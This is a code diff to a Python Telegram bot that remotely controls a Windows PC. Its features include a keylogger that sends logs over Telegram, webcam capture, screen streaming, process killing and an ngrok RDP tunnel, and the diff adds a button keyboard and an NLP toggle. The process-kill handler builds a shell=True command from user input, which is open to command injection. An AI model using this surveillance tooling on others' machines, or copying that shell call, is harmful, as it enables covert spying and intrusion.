@@ -1,3 +1,4 @@
+import asyncio
 import socket
 from werkzeug.utils import safe_join
 import live_webserver as lw
@@ -16,8 +17,9 @@ import speech_recognition as sr
 import pyttsx3
 from pyngrok import ngrok
 import joblib
-from telegram import InlineKeyboardMarkup, InlineKeyboardButton, Update
+from telegram import InlineKeyboardMarkup, InlineKeyboardButton, Update, ReplyKeyboardMarkup
 from telegram.ext import ContextTypes
+import asyncio
 
 if (os.getenv("CHAT_BOT_ENABLED") != "False"):
     import ollama
@@ -99,12 +101,29 @@ class Features:
         self.screen_state = False
         self.video_state = False
         self.chat_history = {}  # Dictionary to store chat history
+        self.no_nlp = {}  # Dictionary to store no NLP flag per chat
         self.chat_mode = {}  # Dictionary to store chat modes
         self.nlp_classifier_output = {}  # Dictionary to store NLP classifier outputut
         self.keyboard = InlineKeyboardMarkup([
             [InlineKeyboardButton('yes', callback_data='yes'), InlineKeyboardButton(
                 'no', callback_data='no')],
         ])
+        self.reply_keyboard = ReplyKeyboardMarkup(
+            [['Video Streaming', 'Screen Sharing',],
+             ['Screenshot', 'Photo',],
+             ['Keyloger',  'List Users',],
+             ['Remote Desktop', 'NLP State']],
+            resize_keyboard=True, one_time_keyboard=False)
+        self.reply_keyboard_to_commad = {
+            'Video Streaming': 'video',
+            'Screen Sharing': 'screen',
+            'Screenshot': 'screenshot',
+            'Photo': 'photo',
+            'Keyloger': 'keylog',
+            'List Users': 'list',
+            'Remote Desktop': 'rdp',
+            'NLP State': 'nlp',
+        }
         self.command_handlers = {
             "send": self.send,
             "video": self.video,
@@ -119,6 +138,7 @@ class Features:
             "list": self.list_users,
             "kick": self.kick_user,
             "rdp": self.start_stop_rdp_tunnel,
+            'nlp': self.set_nlp_flag_async,
         }
         self._commmand_confrimation_msg = {
             "send": "did you mean to send a document?",
@@ -146,6 +166,19 @@ class Features:
                 with open(self.authorzed_users, 'w') as f:
                     json.dump(data, f, indent=2)
 
+    async def set_nlp_flag_async(self, chat_id, command, command_list, first_name, last_name, context):
+        """
+        Sets the NLP flag for the given chat_id.
+
+        Args:
+            chat_id (int): The chat ID of the user.
+            flag (bool): The NLP flag to be set.
+        """
+        if self.no_nlp.get(chat_id) is None:
+            self.no_nlp[chat_id] = True
+        self.no_nlp[chat_id] = not self.no_nlp[chat_id]
+        await context.bot.send_message(chat_id=chat_id, text='NLP enabled' if self.no_nlp[chat_id] else 'NLP disabled')
+
     async def test_message_async(self, bot):
         """
         Sends a test message to the admin with the IP configuration details.
@@ -154,8 +187,9 @@ class Features:
         while (i > 0):
             messag = Popen('ipconfig', shell=True, stdout=PIPE,
                            text=True).communicate()[0]
-            await bot.send_message(chat_id=self.admin_chat_id, text=messag)
+            await bot.send_message(chat_id=self.admin_chat_id, text=messag, reply_markup=self.reply_keyboard)
             i = i - 1
+            asyncio.sleep(.5)
 
     async def live_server(self, chat_id, first_name, last_name, context):
         """
@@ -401,22 +435,6 @@ class Features:
         self.file_message_id = "aa"
         return True, text
 
-    def speak(self, chat_id, command, command_list, first_name, last_name):
-        """
-        Converts text to speech and plays it.
-
-        Args:
-            chat_id (int): The chat ID of the user.
-            command (str): The text command to be spoken.
-            command_list (list): The list of command arguments.
-            first_name (str): The first name of the user.
-            last_name (str): The last name of the user.
-        """
-        speak = pyttsx3.init()
-        x = len(command_list[0])
-        speak.say(command[x:])
-        speak.runAndWait()
-
     async def speak(self, chat_id, command, command_list, first_name, last_name, context):
         """
         Converts text to speech and plays it.
@@ -467,25 +485,6 @@ class Features:
         await context.bot.send_photo(chat_id=chat_id, photo=open("screen.png", 'rb'))
         os.remove("screen.png")
 
-    def kill_task(self, chat_id, command, command_list, first_name, last_name):
-        """
-        Kills a task based on the provided command.
-
-        Args:
-            chat_id (int): The chat ID of the user.
-            command (str): The command received from the user.
-            command_list (list): The list of command arguments.
-            first_name (str): The first name of the user.
-            last_name (str): The last name of the user.
-        """
-        command_exec = f'''Taskkill /f /Im "{command_list[1]}.exe" /t'''
-        if len(command_list) == 2:
-            message = Popen(command_exec, shell=True,
-                            stdout=PIPE, text=True).communicate()[0]
-        else:
-            message = 'Invalid command'
-        self.telegram_bot.send_message(chat_id=chat_id, text=message)
-
     async def kill_task(self, chat_id, command, command_list, first_name, last_name, context):
         """
         Kills a task based on the provided command.
@@ -506,21 +505,6 @@ class Features:
             message = 'Invalid command'
         await context.bot.send_message(chat_id=chat_id, text=message)
 
-    def keyboard_type(self, chat_id, command, command_list, first_name, last_name):
-        """
-        Simulates keyboard typing of the given command.
-
-        Args:
-            chat_id (int): The chat ID of the user.
-            command (str): The command to be typed.
-            command_list (list): The list of command arguments.
-            first_name (str): The first name of the user.
-            last_name (str): The last name of the user.
-        """
-        keyboard = key()
-        x = len(command_list[0])
-        keyboard.type(command[x+1:])
-
     async def keyboard_type(self, chat_id, command, command_list, first_name, last_name, context):
         """
         Simulates keyboard typing of the given command.
@@ -536,34 +520,6 @@ class Features:
         keyboard = key()
         x = len(command_list[0])
         keyboard.type(command[x+1:])
-
-    def take_photo(self, chat_id, command, command_list, first_name, last_name):
-        """
-        Takes a photo using the webcam and sends it to the specified chat ID.
-
-        Args:
-            chat_id (int): The chat ID to send the photo to.
-            command (str): The command received from the user.
-            command_list (list): The list of command arguments.
-            first_name (str): The first name of the user.
-            last_name (str): The last name of the user.
-        """
-        vod = cv2.VideoCapture(0)
-        if not vod.isOpened():
-            self.telegram_bot.sendMessage(
-                chat_id, "No camera attached or accessible.")
-            return
-
-        ret, img = vod.read()
-        vod.release()
-
-        if ret:
-            cv2.imwrite(self.photo_name, img)
-            self.telegram_bot.sendPhoto(
-                chat_id, photo=open(self.photo_name, 'rb'))
-            os.remove(self.photo_name)
-        else:
-            self.telegram_bot.sendMessage(chat_id, "Failed to capture image.")
 
     async def take_photo(self, chat_id, command, command_list, first_name, last_name, context):
         """
@@ -593,42 +549,6 @@ class Features:
             os.remove(self.photo_name)
         else:
             await context.bot.send_message(chat_id=chat_id, text="Failed to capture image.")
-
-    def key_logger(self, chat_id, command, command_list, first_name, last_name):
-        """
-        Starts or stops the key logger based on the current logging state.
-
-        Args:
-            chat_id (int): The chat ID of the user.
-            command (str): The command received from the user.
-            command_list (list): The list of command arguments.
-            first_name (str): The first name of the user.
-            last_name (str): The last name of the user.
-        """
-        if not self.logging:
-            self.logger = Listener(on_press=key_handeler)
-            self.logger.start()
-            self.telegram_bot.send_message(
-                chat_id=chat_id, text="Key logger started")
-            self.logging = True
-            if not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)):
-                self.telegram_bot.send_message(
-                    chat_id=self.admin_chat_id, text=f'''Key logger started by {first_name} {last_name}.''')
-        else:
-            self.logger.stop()
-            self.telegram_bot.send_message(
-                chat_id=chat_id, text="Key logger stopped")
-            self.telegram_bot.send_document(
-                chat_id=chat_id, document=open(self.key_log_file, "rb"))
-            if not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)):
-                self.telegram_bot.send_message(chat_id=self.admin_chat_id, text=f'''Key logger stopped by {first_name} {last_name},
-here is log''')
-                self.telegram_bot.send_document(
-                    chat_id=self.admin_chat_id, document=open(self.key_log_file, "rb"))
-            x = open(self.key_log_file, "w")
-            x.close()
-            os.remove(self.key_log_file)
-            self.logging = False
 
     async def key_logger(self, chat_id, command, command_list, first_name, last_name, context):
         """
@@ -667,30 +587,6 @@ here is log''')
             os.remove(self.key_log_file)
             self.logging = False
 
-    def send_first_auth_code(self, chat_id, name):
-        """
-        Sends the first authorization code to the user.
-
-        Args:
-            chat_id (int): The chat ID of the user.
-            name (str): The name of the user.
-        """
-        self.random = str(secrets.token_hex(6)).upper()
-        print(self.random, type(self.random))
-
-        self.telegram_bot.send_message(
-            chat_id=self.admin_chat_id, text=self.random)
-        self.telegram_bot.send_message(chat_id=self.admin_chat_id, text=str(
-            'do you want to authorize ' + name))
-
-        self.telegram_bot.send_message(
-            chat_id=chat_id, text=f'you are not an authorized user please contact {self.admin_name}')
-        self.telegram_bot.send_message(
-            chat_id=chat_id, text=f'{self.pronoun} will tell you the authorization code')
-        self.aut_chat_id = chat_id
-        self.pending = 1
-        print(self.pending, self.aut_chat_id)
-
     async def send_first_auth_code_async(self, chat_id, name, context):
         """
         Sends the first authorization code to the user.
@@ -716,31 +612,6 @@ here is log''')
         self.pending = 1
         print(self.pending, self.aut_chat_id)
 
-    def receive_auth_code(self, name, chat_id, command):
-        """
-        Receives and verifies the authorization code from the user.
-
-        Args:
-            name (str): The name of the user.
-            chat_id (int): The chat ID of the user.
-            command (str): The authorization code provided by the user.
-        """
-        print(self.random)
-        if command == self.random:
-            self.telegram_bot.send_message(
-                chat_id=chat_id, text=str('you are authorized ' + name))
-            new_guy = {'chat_id': chat_id, 'Name': name}
-            print(new_guy)
-            self.auth_list['authorized'].append(new_guy)
-            print(self.auth_list)
-            self.pending = 0
-            with open(self.authorzed_users, 'w') as f:
-                json.dump(self.auth_list, f, indent=2)
-                f.close()
-        else:
-            self.telegram_bot.send_message(
-                chat_id=chat_id, text='sorry invalid code')
-
     async def receive_auth_code_async(self, name, chat_id, command, context):
         """
         Receives and verifies the authorization code from the user.
@@ -754,7 +625,7 @@ here is log''')
         print(self.random)
         if command == self.random:
             await context.bot.send_message(
-                chat_id=chat_id, text=str('you are authorized ' + name))
+                chat_id=chat_id, text=str('you are authorized ' + name), reply_markup=self.reply_keyboard)
             new_guy = {'chat_id': chat_id, 'Name': name}
             print(new_guy)
             self.auth_list['authorized'].append(new_guy)
@@ -813,32 +684,6 @@ here is log''')
         """
         self.chat_mode[chat_id] = 'ai' if is_ai else 'non_ai'
 
-    def retrieve_command_predictions(self, chat_id, command, list_command, first_name, last_name):
-        """
-        Retrieves the predictions for the given command. If the prediction confidence is low, it asks for confirmation.
-
-        Args:
-            chat_id (int): The chat ID of the user.
-            command (str): The command received from the user.
-            list_command (list): The list of command arguments.
-            first_name (str): The first name of the user.
-            last_name (str): The last name of the user.
-
-        Returns:
-            None
-        """
-
-        predictons = self.nlp_model.predict_proba([command])
-        print(self.nlp_model.classes_.tolist()[predictons.argmax()])
-        if predictons.tolist()[0][predictons.argmax()] < 0.5:
-            self.nlp_classifier_output[chat_id] = {
-                'command': command, 'prediction': self.nlp_model.classes_.tolist()[predictons.argmax()]}
-            self.telegram_bot.send_message(chat_id=chat_id, text=self._commmand_confrimation_msg[self.nlp_model.classes_.tolist()[
-                predictons.argmax()]], reply_markup=self.keyboard)
-        else:
-            self.command_handlers[self.nlp_model.classes_.tolist()[predictons.argmax()]](
-                chat_id, command, list_command, first_name, last_name)
-
     async def retrieve_command_predictions_async(self, chat_id, command, list_command, first_name, last_name, context):
         """
         Retrieves the predictions for the given command. If the prediction confidence is low, it asks for confirmation.
@@ -887,8 +732,13 @@ here is log''')
         if command.startswith('>'):
             command = command[1:]
             list_command[0] = list_command[0][1:]
-        print(command, list_command, first_name, last_name, reply)
-        # reply = True
+            reply = True
+        if self.no_nlp.get(chat_id) is False:
+            reply = True
+        if self.reply_keyboard_to_commad.get(command):
+            list_command = [self.reply_keyboard_to_commad[command]]
+            command = self.reply_keyboard_to_commad[command]
+            reply = True
         if not reply:
             await self.retrieve_command_predictions_async(
                 chat_id, command, list_command, first_name, last_name, context)
@@ -941,22 +791,6 @@ here is log''')
             ), first_name, last_name, context, reply=True)
             self.nlp_classifier_output[chat_id] = {}
 
-    def run_language_model(self, chat_id, command, list_command, first_name, last_name):
-        """
-        Runs a language model to generate a response based on the user's input.
-
-        Args:
-            chat_id (int): The chat ID of the user.
-            command (str): The command received from the user.
-            list_command (list): The list of command arguments.
-            first_name (str): The first name of the user.
-            last_name (str): The last name of the user.
-        """
-        if self.chat_bot_enabled == False:
-            self.telegram_bot.send_message(
-                chat_id=chat_id, text="Chat bot is disabled. Please enable it to use this feature.")
-            return
-
     async def run_language_model(self, chat_id, command, list_command, first_name, last_name, context):
         """
         Runs a language model to generate a response based on the user's input.
@@ -990,30 +824,6 @@ here is log''')
         self.record_message(chat_id, f"Bot: {response}")
         await context.bot.send_message(chat_id=chat_id, text=response, parse_mode='Markdown')
 
-    def list_users(self, chat_id, command, list_command, first_name, last_name):
-        """
-        Lists all authorized users and sends the list to the requesting user.
-
-        Args:
-            chat_id (int): The chat ID of the user requesting the list.
-
-        Returns:
-            None
-        """
-        if not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)):
-            self.telegram_bot.sendMessage(
-                chat_id, "You are not authorized to use this command.")
-            return
-        users_available = False
-        user_list = "Authorized Users:\n"
-        for user in self.auth_list['authorized']:
-            if user['chat_id'] is None or user['chat_id'] == int(self.admin_chat_id):
-                continue
-            user_list += f"Name: {user['Name']}, Chat ID:`{user['chat_id']}`\n"
-            users_available = True
-        self.telegram_bot.sendMessage(
-            chat_id,   user_list if users_available else 'No authorized users', parse_mode='MarkdownV2')
-
     async def list_users(self, chat_id, command, list_command, first_name, last_name, context):
         """
         Lists all authorized users and sends the list to the requesting user.
@@ -1038,41 +848,6 @@ here is log''')
             users_available = True
         await context.bot.send_message(
             chat_id=chat_id, text=user_list if users_available else 'No authorized users', parse_mode='MarkdownV2')
-
-    def kick_user(self, chat_id, command, list_command, first_name, last_name):
-        """
-        Removes a user from the authorized list and notifies them.
-
-        Args:
-            chat_id (int): The chat ID of the user to be removed.
-
-        Returns:
-            None
-        """
-        if not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)):
-            self.telegram_bot.send_message(
-                chat_id=chat_id, text="You are not authorized to use this command.")
-            return
-        remove_chat_id = list_command[1] if len(list_command) > 1 else None
-        if remove_chat_id and remove_chat_id.isdigit():
-            remove_chat_id = int(remove_chat_id)
-        else:
-            remove_chat_id = None
-        if not remove_chat_id:
-            self.telegram_bot.send_message(
-                chat_id=chat_id, text="Please provide the chat ID of the user to remove.")
-            return
-        user_to_remove = next(
-            (user for user in self.auth_list['authorized'] if user['chat_id'] == remove_chat_id), None)
-        if user_to_remove:
-            self.auth_list['authorized'].remove(user_to_remove)
-            with open(self.authorzed_users, 'w') as f:
-                json.dump(self.auth_list, f, indent=2)
-            self.telegram_bot.send_message(
-                self.admin_chat_id, f"User {user_to_remove['Name']} has been kicked.")
-        else:
-            self.telegram_bot.send_message(
-                self.admin_chat_id, "User not found in the authorized list.")
 
     async def kick_user(self, chat_id, command, list_command, first_name, last_name, context):
         """
@@ -1109,40 +884,6 @@ here is log''')
         else:
             await context.bot.send_message(
                 chat_id=self.admin_chat_id, text="User not found in the authorized list.")
-
-    def start_stop_rdp_tunnel(self, chat_id, command, list_command, first_name, last_name):
-        # Set up ngrok tunnel
-        if (self.rdp_active):
-            ngrok.kill()
-            self.rdp_active = False
-            self.telegram_bot.send_message(
-                chat_id=chat_id, text="RDP tunnel stopped")
-            if (not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id))):
-                self.telegram_bot.send_message(
-                    chat_id=self.admin_chat_id, text=f'''RDP tunnel stopped by {first_name} {last_name}''')
-            return
-        elif (self.video_state):
-            self.telegram_bot.send_message(
-                chat_id=chat_id, text="Cannot start RDP tunnel as other video feed is running on the server")
-            return
-        elif (self.screen_state):
-            self.telegram_bot.send_message(
-                chat_id=chat_id, text="Cannot start RDP tunnel as other screen feed is running on the server")
-            return
-        ngrok_tunnel = ngrok.connect(self.rdp_port, "tcp")
-
-        self.rdp_active = True
-        # Get tunnel information
-        tunnel_domain = ngrok_tunnel.public_url.split("/")[2].split(":")[0]
-        # get ip address from domain:port
-        print(ngrok_tunnel.public_url.split("/"))
-        tunnel_ip = socket.gethostbyname(tunnel_domain)
-        tunnel_port = ngrok_tunnel.public_url.split(":")[2]
-        self.telegram_bot.send_message(
-            chat_id, f"RDP tunnel started at `{tunnel_ip}:{tunnel_port}`", parse_mode='MarkdownV2')
-        if (not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id))):
-            self.telegram_bot.send_message(
-                chat_id=self.admin_chat_id, text=f'''RDP tunnel started by {first_name} {last_name}''')
 
     async def start_stop_rdp_tunnel(self, chat_id, command, list_command, first_name, last_name, context):
         # Set up ngrok tunnel
